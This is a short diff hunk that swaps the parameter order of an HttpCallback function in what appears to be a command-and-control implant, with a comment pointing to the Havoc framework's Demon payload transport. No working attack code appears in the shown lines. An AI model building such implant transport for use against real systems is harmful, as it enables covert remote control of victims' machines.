@@ -208,7 +208,7 @@ namespace Network {
             return true;
         }
 
-        BOOL HttpCallback(_stream *out, _stream **in) {
+        BOOL HttpCallback(_stream **in, _stream *out) {
             // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
             // TODO: reverting tokens during http operations
 
